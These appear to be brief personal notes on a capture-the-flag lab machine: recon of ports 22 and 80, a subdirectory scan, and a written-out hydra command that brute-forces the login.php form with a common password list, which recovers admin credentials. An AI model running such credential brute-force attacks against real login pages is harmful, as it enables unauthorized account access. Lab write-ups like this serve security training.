## Info

    ATTACKER=10.10.14.40
    VICTIM=10.10.11.104

## Recon

    bash ../../scripts/discovery/first-scan.sh $VICTIM > recon.txt

Looks like port 22 and 80 are open.

### Port 80

There's a login page, you can `POST http://10.10.11.104/login.php username=asdf&password=ASDF`.

Probably try cred stuffing?

#### Subdir scan

    bash ../../scripts/discovery/subdirectory-scan.sh $VICTIM

#### Cred stuffing

    hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
    
Apparently it worked. `admin:asdfasdf`. Wow!

